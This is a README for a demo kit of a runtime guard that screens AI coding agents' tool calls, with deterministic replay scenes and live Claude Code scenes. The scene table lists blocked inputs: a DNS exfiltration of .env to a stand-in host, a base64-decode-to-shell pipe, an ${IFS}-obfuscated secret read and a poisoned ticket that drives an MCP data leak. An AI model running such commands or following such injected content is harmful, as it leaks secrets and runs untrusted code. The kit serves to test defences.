# Hashimori Runtime — demo kit

Everything here is real: real hook payloads, the real engine, a real MCP server,
and (for the live scenes) real Claude Code. All credentials and customer data
are fake.

```
demo/
├── setup.sh          one-time setup: venv, install, envelope, Claude Code settings
├── replay.sh         10 deterministic scenes (no agent) — record these first
├── SCENES.md         prompts for the live Claude Code scenes + what to expect
├── mcp_server.py     acme-support MCP server (stdio, no dependencies)
├── jev_probe.py      judge vs rules on 23 labeled calls + 8 steered variants
├── intake/coding-agent.json   design-time intake for the demo agent
└── workspace/        the project the agent works in (.env is FAKE)
```

## 1. Set up (≈1 minute)

```bash
cd hashimori            # repo root, on the runtime branch
./demo/setup.sh         # add --fast for the resident server, --judge FILE for Jev
```

## 2. Deterministic scenes

```bash
./demo/replay.sh        # all scenes
./demo/replay.sh 4      # one scene
PAUSE=2 ./demo/replay.sh   # slow enough to film
```

| # | Scene | What it proves |
|---|---|---|
| 1 | Same tool, three calls | `Write` to a log ✓ · to `.mcp.json` ⛔ · to `/etc/passwd` ⛔ |
| 2 | Allowed tool, bad arguments | `dig $(… .env …).exfil.example` ⛔ RUNTIME-004 |
| 3 | Rewrite before refuse | `rm -rf build` → quarantine move ↺ |
| 4 | Context across calls (MCP) | ticket → CRM → partner chat ⛔ lethal trifecta |
| 5 | Delegation | parent reads `.env`; sub-agent's fetch ⛔ |
| 6 | Unknowns fail closed | `… | base64 -d | sh`, `cat${IFS}.env` → ask |
| 7 | The bridge | DENIED use case at design time → every call ⛔ |
| 8 | Price, don't permit | five cheap calls; the fourth breaches the budget → ask |
| 9 | Semantic judge | needs `HASHIMORI_JUDGE=jev` + key (see below) |
| 10 | Cost | `hashimori bench` on this machine |
| 11 | The fleet is the sensor | 40 simulated agents, one poisoned ticket → campaign alert + "allowed elsewhere" + Gatehouse page |
| 12 | Say less to the agent | agent sees an incident id; the audit keeps the reason |
| 13 | Undo | rewritten `rm` → quarantine; agent can't purge it; `hashimori restore` |

## 3. Live scenes with Claude Code

```bash
cd demo/workspace && claude
```

Prompts and expected outcomes are in [SCENES.md](SCENES.md). Watch decisions
stream in another terminal:

```bash
tail -f demo/workspace/.hashimori/audit.jsonl | python3 -c "import sys,json;[print(r.get('agent'),r.get('tool'),r.get('decision'),r.get('red_zones'),r.get('price')) for r in map(json.loads,sys.stdin) if 'decision' in r]"
```

## 4. The judge (optional, costs fractions of a cent)

```bash
set -a; . ~/Desktop/"BSides Orlando Sep 24th 2026"/secrets/typesafe.env; set +a
export HASHIMORI_JUDGE=jev
python3 demo/jev_probe.py          # → demo/results/jev-probe-*.json
./demo/replay.sh 9
```

Every judge call is metered in `~/.hashimori/judge-usage.json`; calls stop at
`HASHIMORI_JUDGE_BUDGET_USD` (default $2.00). A stopped judge fails closed.

## 5. Evaluation on public datasets

```bash
python3 demo/eval/fetch_hf.py        # Hugging Face copies (needs huggingface.co)
python3 demo/eval/run_eval.py        # → demo/eval/results/report.md + summary.json + CSVs
python3 demo/eval/make_charts.py     # → slide-ready SVG charts
```

## Reset between takes

```bash
demo/.venv/bin/hashimori ledger reset --home demo/workspace/.hashimori
rm -rf demo/workspace/.hashimori-trash demo/chat-outbox.log
git checkout demo/workspace     # restore build/ and src/
```
